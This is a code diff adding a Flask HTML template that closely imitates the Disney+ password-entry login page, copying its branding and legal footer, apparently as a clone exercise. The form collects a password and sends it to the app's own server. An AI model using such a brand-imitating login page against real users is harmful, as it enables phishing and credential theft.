@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Entrar no Disney+</title>
+        <link rel="stylesheet"  href="{{ url_for('static',filename='css/disney_passo2.css') }}">
+    </head>
+    <body>
+        <div class="parte_de_cima">
+            <div class="box">
+                <div class="parte_do_meio">
+                    <img src="../static/logo_disney.png" alt="disney" width="190" height="190">
+                        <div class="caixa_de_dentro">
+                            <strong>PASSO 2</strong>
+                            <h1>Digite a senha</H1>
+                            <p id="info">Entre na conta com o seu e-mail:</p><br>
+                            <p id="email_css">{{email}}<a class='link_editar' href=" {{ url_for('teste') }}">Editar</a></p><br>
+                            <form action="{{ url_for('tela_principal') }}" method="POST">
+                                <input required type="password" name="senha_email_user" id="senha_email_page" placeholder="    Senha"><br>
+                                <p id="informativo_senha">(Maiusculo e Minusculo)</p>
+                                <button type="submit">Entrar</button>
+                            </form>
+                        </div>
+                </div>
+            </div>
+
+
+        </div>
+        <footer>
+            <div class="parte_de_baixo">
+                <div class="informativos">
+                    <a>Política de Privacidade</a>
+                    <a>Proteção de Dados no Brasil</a>
+                    <!-- <a>Proteção de Dados no Brasil</a> -->
+                    <a>Contrato de Assinatura</a>
+                    <a>Ajuda</a>
+                    <a>Dispositivos compatíveis</a>
+                    <a>Sobre o Disney+</a>
+                    <a>Anúncios personalizados</a>
+                </div>
+                <div class="texto"></div>                
+                    <p>Disney+ é um serviço pago, baseado em assinatura e sujeito a termos e condições. O serviço Disney+ é comercializado por The Walt Disney Company (Brasil) Ltda., World Trade Center, Av. Das Nações Unidas, 12.551, 12.555, 12.559, Piso 10, São Paulo/SP - CEP 04578-903, Brasil e CNPJ/M 73.042.962/0004-20</p>
+                    <p>© Disney. Todos os direitos reservados.</p>
+                </div>    
+            </div>
+        </footer>
+        
+    </body>
+</html>
